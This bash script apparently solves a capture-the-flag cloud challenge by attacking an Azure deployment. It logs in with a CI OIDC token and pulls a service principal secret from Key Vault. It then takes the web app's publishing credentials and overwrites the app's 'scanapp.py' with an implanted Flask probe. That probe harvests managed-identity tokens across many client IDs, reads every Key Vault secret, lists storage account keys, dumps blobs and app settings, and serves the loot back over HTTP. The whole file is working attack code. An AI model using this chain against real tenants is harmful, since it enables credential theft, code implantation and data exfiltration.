#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"
SHOST="app-tbl-reporting-prod.scm.azurewebsites.net"
APP_HOST="app-tbl-reporting-prod.azurewebsites.net"
RPT_RG="rg-tbl-reporting-prod-eus"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

echo "=== GET REPORTING-SERVICE ARM TOKEN ==="
RS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
RS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
RS_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$RS_CID" --data-urlencode "client_secret=$RS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "RS ARM token len=${#RS_AT}"

# Get publishing credentials
PC=$(curl -sS -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RPT_RG/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2023-01-01" \
  -H "Authorization: Bearer $RS_AT" -H "Content-Length: 0")
PU=$(echo "$PC" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("publishingUserName",""))' 2>/dev/null)
PP=$(echo "$PC" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("properties",{}).get("publishingPassword",""))' 2>/dev/null)
echo "Kudu user: $PU"

echo ""
echo "=== DEPLOY COMPREHENSIVE PROBE AS scanapp.py ==="
cat > /tmp/newscan.py << 'PYEOF'
import os, json, urllib.request, urllib.parse, urllib.error, re, base64
from flask import Flask, jsonify
app=Flask(__name__)

UAMI="7a85156a-01c4-4e61-8472-40a92107159b"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"

def dec(t):
    try:
        p=t.split('.')[1]; p+='='*((4-len(p)%4)%4)
        return json.loads(base64.urlsafe_b64decode(p))
    except: return {}

def msi(resource, cid=None):
    IE=os.getenv("IDENTITY_ENDPOINT",""); IH=os.getenv("IDENTITY_HEADER","")
    if not IE: return None,"NO_IE"
    u=IE+"?resource="+urllib.parse.quote(resource,safe="")+"&api-version=2019-08-01"
    if cid: u+="&client_id="+cid
    try:
        req=urllib.request.Request(u,headers={"X-IDENTITY-HEADER":IH})
        with urllib.request.urlopen(req,timeout=20) as r:
            d=json.loads(r.read()); return d.get("access_token",""),None
    except Exception as e:
        b=""
        try: b=e.read().decode()[:300]
        except: pass
        return None,str(e)[:100]+b

def get(url, tok=None, extra=None):
    h={"Authorization":"Bearer "+tok} if tok else {}
    if extra: h.update(extra)
    try:
        req=urllib.request.Request(url,headers=h)
        with urllib.request.urlopen(req,timeout=20) as r: return r.status,r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")[:800]
    except Exception as e: return 0,str(e)[:200]

def post(url, tok, body=b"{}"):
    h={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}
    try:
        req=urllib.request.Request(url,headers=h,data=body,method="POST")
        with urllib.request.urlopen(req,timeout=20) as r: return r.status,r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode("utf-8","replace")[:800]
    except Exception as e: return 0,str(e)[:200]

@app.get("/")
def run():
    out={}
    IE=os.getenv("IDENTITY_ENDPOINT",""); IH=os.getenv("IDENTITY_HEADER","")
    out["IE"]=IE; out["IH_len"]=len(IH)

    # Scan env for flag
    for k,v in os.environ.items():
        if re.search(r"DF26\{",v): out["ENV_FLAG_"+k]=v

    # Try all client IDs (None=sami/system, plus all known)
    all_ids=[None,UAMI,"72ff278a-9e71-43ec-bac4-2ca303f8e462","891fb158-e02c-4428-a885-53b811f369c0",
             "462d1c38-4459-48b8-9333-82e389e59514","58108da8-044e-4d7e-9a46-92e6179b30be",
             "2c34300e-1bc0-41e7-9c1e-8b7571d72c72","038bc35d-131d-4953-9985-ff4a245ccec1",
             "12ed54de-f2eb-4784-804c-3a7a3e83a9e9","881fddce-6208-4af5-a297-7e79c912f83c"]

    for cid in all_ids:
        label=cid[:8] if cid else "system"
        for res in ["https://vault.azure.net/","https://management.azure.com/","https://storage.azure.com/"]:
            t,err=msi(res,cid)
            rname=res.replace("https://","").rstrip("/")
            out[f"{label}_{rname}_len"]=len(t) if t else 0
            if err: out[f"{label}_{rname}_err"]=err
            if t:
                claims=dec(t)
                out[f"{label}_{rname}_oid"]=claims.get("oid","")
                # Key actions based on resource
                if "vault.azure.net" in res:
                    # Try KV sec
                    s,b=get("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4",t)
                    out[f"{label}_kvsec_list"]=(s,b[:2000])
                    if s==200:
                        # List and read all secrets
                        try:
                            secs=json.loads(b).get("value",[])
                            for sec in secs:
                                sv=sec["id"].rsplit("/",1)[-1]
                                s2,b2=get(sec["id"]+"?api-version=7.4",t)
                                if s2==200: out[f"SECRET_kvsec_{sv}"]=json.loads(b2).get("value","")[:500]
                        except: pass
                    s3,b3=get("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",t)
                    out[f"{label}_kvsec_flag"]=(s3,b3[:500])
                elif "management.azure.com" in res:
                    # Try listKeys on backup storage
                    for sa in ["sttblbackupprodx3euoz","sttblappcfgprodx3euoz","sttblarchiveprodx3euoz"]:
                        s,b=post(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01",t)
                        if s==200:
                            keys=json.loads(b).get("keys",[])
                            if keys: out[f"{label}_lk_{sa}"]=keys[0].get("value","")[:50]
                    # Read own app settings
                    s,b=post(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01",t)
                    out[f"{label}_own_settings"]=(s,b[:1000])
                    # Read storefront settings
                    s,b=post(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01",t)
                    out[f"{label}_storefront_settings"]=(s,b[:2000])
                elif "storage.azure.com" in res:
                    for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
                        s,b=get(f"https://{sa}.blob.core.windows.net/?comp=list",t,{"x-ms-version":"2021-08-06"})
                        out[f"{label}_sa_{sa}"]=(s,b[:500])
                        if s==200:
                            for cn in re.findall(r"<Name>(.*?)</Name>",b):
                                s2,b2=get(f"https://{sa}.blob.core.windows.net/{cn}?restype=container&comp=list",t,{"x-ms-version":"2021-08-06"})
                                out[f"{label}_{sa}_{cn}"]=(s2,b2[:1000])
                                for bn in re.findall(r"<Name>(.*?)</Name>",b2):
                                    s3,b3=get(f"https://{sa}.blob.core.windows.net/{cn}/{bn}",t,{"x-ms-version":"2021-08-06"})
                                    out[f"{label}_{sa}_{cn}_{bn}"]=(s3,b3[:3000])

    return jsonify(out)
PYEOF

# Upload new scanapp.py
VFS_ST=$(curl -sS -o /dev/null -w '%{http_code}' -u "$PU:$PP" -X PUT \
  -H 'Content-Type: text/plain' -H 'If-Match: *' \
  --data-binary @/tmp/newscan.py \
  "https://${SHOST}/api/vfs/home/site/wwwroot/scanapp.py")
echo "VFS scanapp upload: $VFS_ST"

echo ""
echo "=== RESTART APP VIA ARM ==="
RESTART_RESULT=$(curl -sS -o /dev/null -w '%{http_code}' -X POST \
  "$ARM_BASE/subscriptions/$SUB/resourceGroups/$RPT_RG/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01" \
  -H "Authorization: Bearer $RS_AT" -H "Content-Length: 0")
echo "Restart status: $RESTART_RESULT"

echo "Waiting 30s for app to start..."
sleep 30

echo ""
echo "=== POLL HTTP ENDPOINT FOR MSI RESULTS ==="
for i in 1 2 3; do
  RESP=$(curl -sS -m 120 "https://${APP_HOST}/" 2>/dev/null)
  if echo "$RESP" | python3 -c 'import sys,json;json.load(sys.stdin)' 2>/dev/null; then
    echo "$RESP" | python3 -c '
import sys,json
d=json.load(sys.stdin)
print("IE:", d.get("IE",""))
print("IH_len:", d.get("IH_len",""))
# Print all non-empty/non-error entries
for k,v in sorted(d.items()):
    if k in ("IE","IH_len"): continue
    sv=str(v)
    if sv in ("0","","None","[]","{}",None) or sv.startswith("(0,"): continue
    if "ERR" in k.upper() and "NO_IE" in sv: continue
    if "timeout" in sv.lower() and "_err" in k: continue
    print(f"  {k}: {sv[:300]}")
'
    break
  fi
  echo "Attempt $i: not JSON yet, waiting..."
  sleep 15
done

echo "DONE"
